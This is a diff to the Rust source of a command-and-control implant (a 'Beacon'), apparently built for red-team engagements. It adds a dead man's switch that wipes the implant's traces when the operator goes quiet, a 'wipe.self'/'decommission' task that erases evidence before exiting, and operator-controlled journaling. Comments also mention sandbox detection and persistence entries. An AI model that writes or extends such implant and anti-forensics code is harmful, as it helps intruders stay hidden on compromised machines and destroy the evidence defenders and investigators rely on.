@@ -203,6 +203,14 @@ impl Beacon {
                     return Ok(());
                 }
             }
+            // The dead man's switch: the operator stopped checking in, so
+            // the implant takes its traces with it and leaves.  An implant
+            // that outlives its engagement is an implant nobody watches.
+            if crate::forensics::deadman_fired() {
+                self.log("the dead man's switch fired: the operator went quiet");
+                let _ = crate::forensics::decommission(&self.context(), &Value::Null);
+                return Ok(());
+            }
             // A host that looks like an analyst's sandbox is a host where
             // the implant may not answer at all.  The operator decides
             // whether it does; the default is to keep checking in.
@@ -585,6 +593,14 @@ impl Beacon {
             ch.set_session_id(&crate::config::hex_encode(&session_id));
         }
         self.log("handshake complete");
+        // The journal of the engagement is a trace of its own, so it is
+        // written only while the operator asks for it.
+        if crate::forensics::journal_enabled() {
+            crate::forensics::journal("handshake", "the session with the server is open");
+        }
+        // Every check-in of the operator is a proof that the engagement is
+        // alive, so the dead man's switch renews its window.
+        crate::forensics::deadman_renew();
         Ok(())
     }
 
@@ -797,6 +813,9 @@ impl Beacon {
                 continue;
             }
             self.log(&format!("task {id} kind={kind}"));
+            if crate::forensics::journal_enabled() {
+                crate::forensics::journal("task", &kind);
+            }
 
             // The marker of the kill switch: the operator sends it and the
             // implant stops existing, with its persistence entries.
@@ -906,6 +925,17 @@ impl Beacon {
                     self.send_result(&id, outcome)?;
                     self.send_bye()?;
                     self.terminate("the operator ended the engagement");
+                    return Ok(false);
+                }
+                "wipe.self" | "decommission" => {
+                    // The end of the engagement: the answer of the wipe
+                    // travels first, so the operator reads what was
+                    // removed and what was not, and then the implant
+                    // leaves the machine.
+                    let outcome = task::run(&self.context(), &kind, &args);
+                    self.send_result(&id, outcome)?;
+                    self.send_bye()?;
+                    self.terminate("the implant wiped its traces and left");
                     return Ok(false);
                 }
                 "sleep" => {
